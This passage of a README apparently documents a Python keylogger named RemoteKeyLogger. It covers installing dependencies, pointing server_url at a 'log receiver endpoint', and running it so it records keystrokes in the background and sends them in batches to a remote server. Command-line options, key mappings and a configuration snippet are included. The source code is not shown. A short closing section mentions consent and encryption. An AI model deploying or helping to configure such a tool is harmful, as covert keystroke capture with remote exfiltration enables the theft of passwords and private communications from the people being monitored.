<hr>
cd Keylogger.py
Install Required Dependencies:

<hr>
pip install -r requirements.txt
<hr>
Configure the Server:
Update the server_url in the Python script (main.py) to point to your log receiver endpoint.

Run the KeyLogger:


<hr>
python main.py
<hr>
🎯 Usage
After installation, the KeyLogger will begin logging keystrokes immediately.<br> It works in the background and periodically transmits logs based on your configured buffer size.

Command-line Options:
Log File: Customize the path where logs are stored locally.
Buffer Size: Adjust the number of keystrokes before sending logs to the server.
Example Command:


python main.py --log_file "path/to/logfile.txt" --buffer_size 100
Special Key Mapping:<br> 
Space -> <br> 
Enter -> \n  <br> 
Backspace -> [BACKSPACE]  <br> 
Arrow Keys -> [UP], [DOWN], [LEFT], [RIGHT]  <br> 
⚙️ Configuration
The KeyLogger allows you to easily adjust settings within the code, such as the buffer size, log file path, and remote server URL.

Example Configuration:
python
<hr>
server_url = "https://example.com/log_receiver"
logger = RemoteKeyLogger(server_url=server_url, buffer_size=50)
logger.run()
<hr>
🔐 Security Considerations <br> 
**Using this tool responsibly is crucial. Here are some best practices to ensure data privacy and security:**

Encryption: Transmit logs using HTTPS or add custom encryption for better protection.
Server Authentication: Ensure that only authorized entities can access the remote server.
Compliance: Always secure explicit consent from monitored users and ensure compliance with legal requirements. <br> <br>
